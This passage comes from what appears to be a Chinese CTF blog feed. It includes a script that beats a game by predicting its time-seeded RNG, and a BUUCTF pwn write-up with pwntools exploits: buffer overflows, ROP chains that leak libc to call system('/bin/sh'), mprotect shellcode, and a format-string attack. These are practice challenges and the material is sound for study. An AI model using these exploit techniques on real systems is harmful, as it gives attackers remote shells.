class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python -u</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> dfs</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NOTHING = <span class="number">0</span></span><br><span class="line">WALL = <span class="number">1</span></span><br><span class="line">BOMB = <span class="number">2</span></span><br><span class="line">CAT = <span class="number">3</span></span><br><span class="line">PERSON = <span class="number">4</span></span><br><span class="line">dic = dfs.dic</span><br><span class="line">directions = [<span class="string">'u'</span>, <span class="string">'d'</span>, <span class="string">'l'</span>, <span class="string">'r'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randint</span><span class="params">(start, end)</span>:</span></span><br><span class="line">    m = end - start + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> random.getrandbits(<span class="number">16</span>) % m + start</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, map)</span>:</span></span><br><span class="line">        self.seed = int(time.time()) + <span class="number">2</span></span><br><span class="line">        random.seed(self.seed)</span><br><span class="line">        self.map = map</span><br><span class="line">        self.n = len(self.map)</span><br><span class="line">        self.x = <span class="number">1</span></span><br><span class="line">        self.y = <span class="number">1</span></span><br><span class="line">        self.cx = <span class="number">0</span></span><br><span class="line">        self.cy = <span class="number">0</span></span><br><span class="line">        self.count = <span class="number">0</span></span><br><span class="line">        self.placeCat(firsttime = <span class="literal">True</span>)</span><br><span class="line">        self.time = <span class="number">0</span></span><br><span class="line">        self.persontime = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">placeCat</span><span class="params">(self, firsttime = False)</span>:</span></span><br><span class="line">        tmpmap = copy.deepcopy(self.map)</span><br><span class="line">        tmpmap[self.x][self.y] = PERSON</span><br><span class="line">        tmpmap[self.cx][self.cy] = CAT</span><br><span class="line">        <span class="keyword">if</span> firsttime:</span><br><span class="line">            i = self.n - <span class="number">2</span></span><br><span class="line">            j = self.n - <span class="number">2</span></span><br><span class="line">            <span class="keyword">while</span> tmpmap[i][j] != NOTHING:</span><br><span class="line">                i -= <span class="number">1</span></span><br><span class="line">                j -= <span class="number">1</span></span><br><span class="line">            self.cx = i</span><br><span class="line">            self.cy = j</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            i = randint(<span class="number">1</span>, self.n - <span class="number">2</span>)</span><br><span class="line">            j = randint(<span class="number">1</span>, self.n - <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">while</span> tmpmap[i][j] != NOTHING:</span><br><span class="line">                i = randint(<span class="number">1</span>, self.n - <span class="number">2</span>)</span><br><span class="line">                j = randint(<span class="number">1</span>, self.n - <span class="number">2</span>)</span><br><span class="line">            self.cx = i</span><br><span class="line">            self.cy = j</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">move</span><span class="params">(self, c, p)</span>:</span></span><br><span class="line">        self.time += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> self.time &gt; <span class="number">4000</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"DARKFLAMEMASTER"</span></span><br><span class="line">            sys.exit(<span class="number">-1</span>)</span><br><span class="line">        tmpmap = copy.deepcopy(self.map)</span><br><span class="line">        tmpmap[self.x][self.y] = PERSON</span><br><span class="line">        tmpmap[self.cx][self.cy] = CAT</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> p == PERSON:</span><br><span class="line">            x = self.x</span><br><span class="line">            y = self.y</span><br><span class="line">        <span class="keyword">elif</span> p == CAT:</span><br><span class="line">            x = self.cx</span><br><span class="line">            y = self.cy</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> c == <span class="string">'u'</span>:</span><br><span class="line">            y -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> c == <span class="string">'d'</span>:</span><br><span class="line">            y += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> c == <span class="string">'l'</span>:</span><br><span class="line">            x -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> c == <span class="string">'r'</span>:</span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> p == PERSON:</span><br><span class="line">            self.persontime += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> tmpmap[x][y] == WALL:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"WALL."</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">elif</span> tmpmap[x][y] == BOMB:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"BOMB."</span></span><br><span class="line">                sys.exit(<span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">elif</span> tmpmap[x][y] == CAT:</span><br><span class="line">                self.count += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> self.count == <span class="number">10</span>:</span><br><span class="line">                    <span class="keyword">print</span> self.time</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"SUCCESS!!!"</span></span><br><span class="line">                self.x = x</span><br><span class="line">                self.y = y</span><br><span class="line">                self.placeCat()</span><br><span class="line">                <span class="comment">#print "Caught!"</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.x = x</span><br><span class="line">                self.y = y</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"OK."</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> p == CAT:</span><br><span class="line">            <span class="keyword">if</span> tmpmap[x][y] == NOTHING:</span><br><span class="line">                self.cx = x</span><br><span class="line">                self.cy = y</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self,direction)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> direction <span class="keyword">not</span> <span class="keyword">in</span> directions:</span><br><span class="line">            sys.exit(<span class="number">-1</span>)</span><br><span class="line">        self.move(direction, PERSON)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.persontime % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">                choice = randint(<span class="number">0</span>, <span class="number">3</span>)</span><br><span class="line">                direction = directions[choice]</span><br><span class="line">                randcount = <span class="number">0</span></span><br><span class="line">                <span class="keyword">while</span> self.move(direction, CAT) == <span class="literal">False</span>:</span><br><span class="line">                    choice = randint(<span class="number">0</span>, <span class="number">3</span>)</span><br><span class="line">                    direction = directions[choice]</span><br><span class="line">                    randcount += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> randcount == <span class="number">10</span>:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">map = [[] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">60</span>)]</span><br><span class="line"></span><br><span class="line">pic = Image.open(<span class="string">'./map_2.png'</span>)</span><br><span class="line">w,h = pic.size</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(h):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(w):</span><br><span class="line">        pixel = pic.getpixel((i,j))</span><br><span class="line">        <span class="keyword">if</span> pixel == (<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>) <span class="keyword">or</span> pixel == (<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>):</span><br><span class="line">            map[i].append(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            map[i].append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">time_1 = int(time.time())</span><br><span class="line">sh = remote(<span class="string">"59.110.63.160"</span>,<span class="number">40001</span>)</span><br><span class="line"><span class="comment">#sh = remote("127.0.0.1",10002)</span></span><br><span class="line">game = Game(map)</span><br><span class="line">time_2 = int(time.time())</span><br><span class="line"><span class="comment">#sleep(0.3)</span></span><br><span class="line"><span class="comment">#print(sh.recv(),game.seed)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> time_1 != time_2:</span><br><span class="line">    print(time_1,time_2)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    path = dfs.dfs_fun(map,(game.x,game.y),(game.cx,game.cy))</span><br><span class="line">    num = [<span class="number">4000</span>,<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">if</span> len(i) &lt; num[<span class="number">0</span>]:</span><br><span class="line">            num[<span class="number">0</span>] = len(i)</span><br><span class="line">            num[<span class="number">1</span>] = path.index(i)</span><br><span class="line">    path = path[num[<span class="number">1</span>]] ; path = path[<span class="number">1</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> path:</span><br><span class="line">        direction = dic[i[<span class="number">-1</span>]]</span><br><span class="line">        tmp_num = int(game.count)</span><br><span class="line">        game.start(direction)</span><br><span class="line">        sh.sendline(direction)</span><br><span class="line">        <span class="comment">#sleep(0.1)</span></span><br><span class="line">        infor = sh.recv(timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">print</span> infor</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Caught"</span> <span class="keyword">in</span> infor:</span><br><span class="line">            pause()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Caught"</span> <span class="keyword">not</span> <span class="keyword">in</span> infor <span class="keyword">and</span> <span class="string">"OK"</span> <span class="keyword">not</span> <span class="keyword">in</span> infor:</span><br><span class="line"></span><br><span class="line">            pause()</span><br><span class="line">        <span class="keyword">if</span> game.count == <span class="number">10</span>:</span><br><span class="line">            pause()</span><br><span class="line">        <span class="keyword">if</span> game.count - tmp_num == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
      <category term="Misc" scheme="http://xibai.xyz/categories/Misc/"/>
    
    
      <category term="CTF" scheme="http://xibai.xyz/tags/CTF/"/>
    
      <category term="Writeup" scheme="http://xibai.xyz/tags/Writeup/"/>
    
      <category term="Misc" scheme="http://xibai.xyz/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF-PWN(一)</title>
    <link href="http://xibai.xyz/2020/05/03/BUU-Pwn-one/"/>
    <id>http://xibai.xyz/2020/05/03/BUU-Pwn-one/</id>
    <published>2020-05-03T09:03:11.000Z</published>
    <updated>2020-11-01T19:07:16.165Z</updated>
    
    <content type="html"><![CDATA[<p><strong>最近更新：</strong> <em>2020-01-31 22:43</em></p><h2 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h2><p>pwnの签到</p><h2 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h2><p>入门溢出覆盖 RIP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./pwn1'</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">'a'</span>*<span class="number">23</span>+p64(<span class="number">0x401186</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><p>同上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">fi = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26624</span>)</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'amd64'</span>,os = <span class="string">'linux'</span>,log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">fi.recvuntil(<span class="string">'WOW:'</span>)</span><br><span class="line"></span><br><span class="line">flag_addr = fi.recv()[:<span class="number">-2</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(int(flag_addr,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">fi.sendline(payload)</span><br><span class="line"></span><br><span class="line">fi.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h2><p>加了个简易路障，输入长度被限制不能直接溢出，但是程序会把‘I’替换为‘you’，计算一下就会知道，只要输入21个‘I’即可进行后续的溢出操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process('./pwn1_sctf_2016')</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28810</span>)</span><br><span class="line">payload = <span class="string">'I'</span>*<span class="number">21</span> + <span class="string">'a'</span> + p32(<span class="number">0x8048f13</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><p>依旧是简单的额变量溢出覆盖，将<code>float</code>变量覆盖为相应的十六进制即可。这里可以直接百度 float 变量的数据是如何解析的，然后构造相应的二进制或十六进制数值即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process('./ciscn_2019_n_1')</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29674</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x2c</span> + p64(<span class="number">0x41348000</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><p>我丢！！！Ubuntu18坑死窝惹555<br>用了好几天时间换各种姿势尝试拿服务器shell，本地的kali明明可以一遍通QAQ。最后无奈搜了大佬的wp才知道Ubuntu18的堆栈对齐问题导致无法执行<code>system</code>函数，而且最后也不知道详细的底层机制原理是啥，只知道Ubuntu18的堆栈对齐很迷，这道题是32字节的对齐宽度，在payload前面加一个<code>ret</code>的地址即可完成对齐。<br>另外，中间尝试通过<code>gets</code>和<code>__isoc99_scanf</code>函数向bss段写入数据，但是无法写入(工具查看是有RW权限的)，疑惑，实在没找到原因，如果写入成功的话或许可以尝试<code>ret2csu</code>来执行<code>execve</code>，这应该不会受到栈对齐的影响.<br>(数次调试后发现，该程序bss段无法写入数据md，不过发现<code>one_gadget</code>可以用)</p><p><strong>继续查资料依旧没有找到Ubuntu18栈对齐对函数能否成功执行的影响原理，只知道堆栈指针对齐一般是16字节或32字节的对齐，其会在某些情况下影响程序的正常执行，而这道题显然就遇到了这‘某些情况’</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'amd64'</span>,log_level = <span class="string">'debug'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ciscn_2019_c_1'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/root/BUU/pwn/libc/ubuntu18/64/libc-2.27.so'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line"></span><br><span class="line">encrypt = p64(elf.symbols[<span class="string">'encrypt'</span>])</span><br><span class="line">libc_start_main_addr = p64(elf.got[<span class="string">'__libc_start_main'</span>])</span><br><span class="line">libc_start_main = libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">puts = p64(elf.plt[<span class="string">'puts'</span>])</span><br><span class="line">rdi_ret = p64(<span class="number">0x400c83</span>)</span><br><span class="line">binsh_64 = libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line">system = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x58</span> + rdi_ret + libc_start_main_addr + puts + encrypt</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./ciscn_2019_c_1')</span></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26004</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input your choice!"</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input your Plaintext to be encrypted\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'Ciphertext\x0a\x0a'</span>)</span><br><span class="line"></span><br><span class="line">tmp_addr = u64(p.recvuntil(<span class="string">"\n"</span>,<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">base = tmp_addr - libc_start_main</span><br><span class="line">binsh_64 += base</span><br><span class="line">system += base</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x58</span> + p64(<span class="number">0x4006b9</span>) + rdi_ret + p64(binsh_64) + p64(system) + encrypt</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p>简单ROP，用<code>\x00</code>绕过<code>strncmp</code>检测，然后溢出复写第二个<code>read</code>读入长度为255.<br>利用write函数泄露got表中已经被用过的函数地址，计算基地址，本题直接给出so文件，直接计算<code>system</code>函数和<code>/bin/sh</code>的地址。这里system直接攻击成功。不再尝试其他姿势。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./pwn')</span></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29623</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">write = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_addr = elf.got[<span class="string">'write'</span>]</span><br><span class="line">main = <span class="number">0x8048825</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x00'</span> * <span class="number">7</span> + <span class="string">'\xff'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0xeb</span></span><br><span class="line">payload += p32(write) + p32(main) + p32(<span class="number">1</span>) + p32(write_addr) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">base = u32(p.recv(<span class="number">4</span>)) - libc.symbols[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">system = libc.symbols[<span class="string">'system'</span>] + base</span><br><span class="line">binsh = libc.search(<span class="string">'/bin/sh\x00'</span>).next() + base</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x00'</span> * <span class="number">7</span> + <span class="string">'\xff'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0xeb</span></span><br><span class="line">payload += p32(system) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><p>我吐了，emp无敌。这道题看源码发现和上面<code>ciscn_2019_c_1</code>一模一样，但是exp打了好几遍就是打不通，本地是可以通的。无奈搜别的大佬的wp看是不是又有什么奇怪的姿势，发现确实是和上一题的共用一个exp就可以。<br>这里看到大佬用的<code>libcsearcher</code>而非BUU直接给出的libc，就去试了下libcsearcher尝试是不是libc的问题，然后就神奇的通了。。。但这里不是吐血的地方！<br>最神奇和吐血的地方是，这个时候因为<strong>觉得BUU一般的pwn题应该就是用的直接给出的对应的libc才对</strong>就把后来加上的<code>libcsearcher</code>相关的代码<strong>全删了用之前没改的代码，这一次突然就通了</strong>！？？？吐血emmm</p><h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><p>这道题感觉远程的文件权限是不是没分配好，也可能是故意为之，毕竟题目里放了一堆函数，然后给一个假的后门。<br>这里get到知识点，<code>mprotect</code>函数修改内存权限，然后向其中写入shellcode进行调用getshell。</p><p>利用脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process("./get_started_3dsctf_2016")</span></span><br><span class="line">sh = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28183</span>)</span><br><span class="line">elf = ELF(<span class="string">"get_started_3dsctf_2016"</span>)</span><br><span class="line"></span><br><span class="line">pop2_ret = <span class="number">0x0809a7dc</span></span><br><span class="line">pop3_ret = <span class="number">0x0804f460</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">56</span> + p32(elf.symbols[<span class="string">'mprotect'</span>]) + p32(pop3_ret) + p32(<span class="number">0x080EB000</span>) + p32(<span class="number">0x3000</span>) + p32(<span class="number">7</span>) + p32(elf.symbols[<span class="string">'read'</span>]) + p32(pop3_ret) + p32(<span class="number">0</span>) + p32(<span class="number">0x080EBF80</span>) + p32(<span class="number">0x200</span>) + p32(<span class="number">0x080EBF80</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.sendline(asm(shellcraft.sh()))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="第五空间2019决赛-PWN5"><a href="#第五空间2019决赛-PWN5" class="headerlink" title="[第五空间2019决赛] PWN5"></a>[第五空间2019决赛] PWN5</h2><p>我与bug，同生共死！！！<br>这道题就是非常简单的格式化输出题目，<code>%s</code>or<code>%n</code>都可以秒，不过用<code>%s</code>会有玄学失败bug（ps：至少我会有玄学失败bug，如果未来有刷buu的萌新看到这里不用疑惑，先做再说，不过估计也没人会看到嘿嘿嘿）<br>题目本身很简单，读取了四字节随机数，然后输入一个整数和随机数比较，一样就直接shell。读取随机数的操作在输入buf之前，也就是可以利用格式化输出的漏洞修改或者直接输出随机数内容。然后直接输入一直数值获取shell。</p><p>这个脚本是用<code>%s</code>读取随机数的内容然后直接输入。运行的时候概率性fail（吐血）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28350</span>)</span><br><span class="line"><span class="comment">#p = process('./pwn')</span></span><br><span class="line"></span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x804c044</span>) + <span class="string">'%10$s'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">print(p.recv(<span class="number">6</span>))</span><br><span class="line">tmp = u32(p.recv()[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">p.sendline(str(tmp))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
      <category term="Pwn" scheme="http://xibai.xyz/categories/Pwn/"/>
    
    
      <category term="CTF" scheme="http://xibai.xyz/tags/CTF/"/>
    
      <category term="Writeup" scheme="http://xibai.xyz/tags/Writeup/"/>
    
      <category term="Pwn" scheme="http://xibai.xyz/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>(密码学)(crypto)ECC_Crypto(椭圆曲线加密)——python实现</title>
    <link href="http://xibai.xyz/2020/04/30/(crypto)ECC_Crypto/"/>
    <id>http://xibai.xyz/2020/04/30/(crypto)ECC_Crypto/</id>
    <published>2020-04-29T17:14:37.531Z</published>
